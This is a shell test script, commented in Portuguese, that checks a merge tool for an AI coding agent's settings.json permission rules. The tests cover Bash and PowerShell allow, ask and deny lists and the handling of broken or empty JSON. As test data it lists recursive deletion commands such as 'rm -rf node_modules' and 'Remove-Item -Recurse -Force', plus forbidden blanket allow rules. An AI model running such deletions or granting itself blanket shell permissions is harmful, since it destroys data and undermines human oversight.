SAIDA_A2="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
printf '%s' "$SAIDA_A2" | grep -q 'passa(m) a perguntar' && { echo "  FALHA repete o aviso na 2ª passada"; falhas=$((falhas+1)); } \
  || echo "  ok    2ª passada não repete o aviso"

for c in 'rm -rf .next' 'rm -rf node_modules' 'rm -rf dist' 'rm -r build'; do
  if casa ask Bash "$c" || casa deny Bash "$c"; then echo "  FALHA ask/deny novo pega: $c"; falhas=$((falhas+1))
  else echo "  ok    continua livre (acceptEdits aprova rm no projeto): $c"; fi
done
for c in 'Remove-Item .next -Recurse -Force' 'Remove-Item -Recurse -Force C:\\x' 'Remove-Item dist -r'; do
  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
SEM_ESPELHO="$(node -e '
const p = require(process.argv[1]).permissions
const n = (r) => r.replace(/:\*\)$/, " *)")
const falta = []
for (const l of ["deny", "ask"]) {
  const ps = new Set((p[l] || []).filter((r) => r.startsWith("PowerShell(")).map(n))
  for (const r of p[l] || []) if (r.startsWith("Bash(") && !ps.has(n("PowerShell(" + r.slice(5)))) falta.push(l + ":" + r)
}
console.log(falta.join(" "))' "$TEMPLATE")"
[ -z "$SEM_ESPELHO" ] && echo "  ok    todo deny/ask de Bash tem o espelho PowerShell(...)" \
  || { echo "  FALHA sem espelho PowerShell: $SEM_ESPELHO"; falhas=$((falhas+1)); }
for proibida in 'Bash(*)' 'Bash' 'PowerShell(*)' 'PowerShell' 'Bash(node *)' 'Bash(python3 *)' 'Bash(bash *)' 'PowerShell(node *)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TEMPLATE" "$proibida" \
    && echo "  ok    allow não tem $proibida" || { echo "  FALHA allow genérico: $proibida"; falhas=$((falhas+1)); }
done
grep -q '"Write(' "$TEMPLATE" && { echo "  FALHA regra Write( no template (nunca é consultada; use Edit)"; falhas=$((falhas+1)); } \
  || echo "  ok    nenhuma regra Write("
node -e 'process.exit(require(process.argv[1]).permissions.allow.some(r=>r.startsWith("PowerShell(")) ? 0 : 1)' "$TEMPLATE" \
  && echo "  ok    allow tem regras PowerShell(...)" || { echo "  FALHA allow sem PowerShell"; falhas=$((falhas+1)); }

echo "== settings.json quebrado não pode ser sobrescrito =="
echo '{ isso não é json' > "$TMP/ruim.json"
node "$MERGE" "$TMP/kit.json" "$TMP/ruim.json" >/dev/null 2>&1
grep -q 'isso não é json' "$TMP/ruim.json" \
  && echo "  ok    arquivo inválido fica intacto" \
  || { echo "  FALHA o arquivo inválido foi sobrescrito"; falhas=$((falhas+1)); }
printf '{\n  "a": 1,\n}\n' > "$TMP/virgula.json"
SAIDA_V="$(node "$MERGE" "$TMP/kit.json" "$TMP/virgula.json" 2>&1)"
printf '%s' "$SAIDA_V" | grep -q 'linha 3, coluna 1' \
  && echo "  ok    o aviso de JSON inválido diz a linha do erro" \
  || { echo "  FALHA o aviso não diz onde está o erro: $SAIDA_V"; falhas=$((falhas+1)); }

echo "== settings.json vazio recebe o kit inteiro =="
: > "$TMP/vazio.json"
node "$MERGE" "$TMP/kit.json" "$TMP/vazio.json" >/dev/null 2>&1
node -e 'process.exit(require(process.argv[1]).language === "portuguese" ? 0 : 1)' "$TMP/vazio.json" 2>/dev/null \
  && echo "  ok    arquivo de 0 bytes vira {} e é mesclado" \
  || { echo "  FALHA arquivo vazio foi tratado como JSON inválido e ficou sem o kit"; falhas=$((falhas+1)); }

echo
if [ "$falhas" -eq 0 ]; then echo "tudo verde"; else echo "$falhas falha(s)"; exit 1; fi
